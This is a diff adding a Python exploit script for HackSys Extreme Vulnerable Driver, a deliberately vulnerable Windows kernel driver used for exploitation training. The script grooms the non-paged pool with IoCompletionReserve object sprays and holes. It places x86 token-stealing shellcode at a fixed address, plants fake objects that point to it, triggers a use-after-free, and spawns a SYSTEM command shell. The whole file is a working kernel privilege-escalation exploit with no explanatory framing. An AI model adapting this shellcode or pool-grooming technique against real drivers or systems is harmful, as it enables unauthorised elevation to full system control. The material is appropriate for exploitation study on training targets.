@@ -1,0 +1,107 @@
+from helper import *
+from ctypes import *
+
+
+def main():
+
+	HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL = ioctl(0x804)
+	HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL = ioctl(0x805)
+	HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL = ioctl(0x806)
+	HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL = ioctl(0x807)
+
+	lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver"
+	handle = get_handle(lpFileName)
+
+	steal_token = (
+		"\x60"                              # pushad
+		"\x33\xc0"                          # xor   eax,eax
+		"\x64\x8b\x80\x24\x01\x00\x00"      # mov   eax,DWORD PTR fs:[eax+0x124]
+		"\x8b\x40\x50"                      # mov   eax,DWORD PTR [eax+0x50]
+		"\x8b\xc8"                          # mov   ecx,eax
+		"\x8b\x80\xb8\x00\x00\x00"          # mov   eax,DWORD PTR [eax+0xb8]
+		"\x2d\xb8\x00\x00\x00"              # sub   eax,0xb8
+		"\x83\xb8\xb4\x00\x00\x00\x04"      # cmp   DWORD PTR [eax+0xb4],0x4
+		"\x75\xec"                          # jne   0xe
+		"\x8b\x90\xf8\x00\x00\x00"          # mov   edx,DWORD PTR [eax+0xf8]
+		"\x89\x91\xf8\x00\x00\x00"          # mov   DWORD PTR [ecx+0xf8],edx
+		"\x61"                              # popad
+		"\xc3"                              # retn
+	)
+
+	# Allocate 'shellcode' at 0x42424242
+	shellcode = "\x90" * 0x08
+	shellcode += steal_token
+	shellcode += "\x90" * (0x80 - 0x08 - len(steal_token))
+	alloc_memory(0x42424242, shellcode, len(shellcode))
+
+	# Spraying the Non-Paged Pool with IoCompletionReserve Objects
+	object_handles = spray_ioco_objects(15000)
+
+	# Creating holes in the sprayed region
+	make_holes_sprayed_region(15000, object_handles)
+
+	# The vulnerable function will responses with an exception code by
+	# sending a wrong magic value; the 'trigger' function will stop due
+	# to this exception.
+	print("[+] Allocating UAF Objects...")
+	kernel32.DeviceIoControl(
+				handle,                                         # _In_        HANDLE
+				HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL,  # _In_        DWORD
+				None,                                           # _In_opt_    LPVOID
+				None,                                           # _In_        DWORD
+				None,                                           # _Out_opt_   LPVOID
+				0,                                              # _In_        DWORD
+				byref(c_ulong()),                               # _Out_opt_   LPDWORD
+				None)                                           # _Inout_opt_ LPOVERLAPPED
+
+
+	print("[+] Freeing UAF Objects...")
+	kernel32.DeviceIoControl(
+				handle,                                     # _In_        HANDLE
+				HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL,  # _In_        DWORD
+				None,                                       # _In_opt_    LPVOID
+				None,                                       # _In_        DWORD
+				None,                                       # _Out_opt_   LPVOID
+				0,                                          # _In_        DWORD
+				byref(c_ulong()),                           # _Out_opt_   LPDWORD
+				None)                                       # _Inout_opt_ LPOVERLAPPED
+
+	# Create a fake object with the address of the shellcode; fill
+	# with '\x41' and the size of an IoCompletionReserve Object (0x60)
+	fake_obj = p32(0x42424242) + "\x41" * (0x60 - 4)
+
+	print("[+] Allocating Fake Objects...")
+	for x in range(5000):
+		kernel32.DeviceIoControl(
+					handle,                                          # _In_        HANDLE
+					HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL,  # _In_        DWORD
+					fake_obj,                                        # _In_opt_    LPVOID
+					len(fake_obj),                                   # _In_        DWORD
+					None,                                            #  _Out_opt_   LPVOID
+					0,                                               # _In_        DWORD
+					byref(c_ulong()),                                # _Out_opt_   LPDWORD
+					None)                                            # _Inout_opt_ LPOVERLAPPED
+
+	print("[+] Triggering UAF...")
+	kernel32.DeviceIoControl(
+				handle,                                    # _In_        HANDLE
+				HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL,  # _In_        DWORD
+				None,                                      # _In_opt_    LPVOID
+				None,                                      # _In_        DWORD
+				None,                                      #  _Out_opt_   LPVOID
+				0,                                         # _In_        DWORD
+				byref(c_ulong()),                          # _Out_opt_   LPDWORD
+				None)                                      # _Inout_opt_ LPOVERLAPPED
+
+	# Free allocated memory
+	free_all_alloc(15000, object_handles)
+
+	# Check if the running process run with SYSTEM privileges
+	if is_system():
+		print("[+] Spawn SYSTEM shell\n")
+		os.system("cmd.exe")
+	else:
+		print("[-] Exploit failed")
+
+if __name__ == "__main__":
+	main()
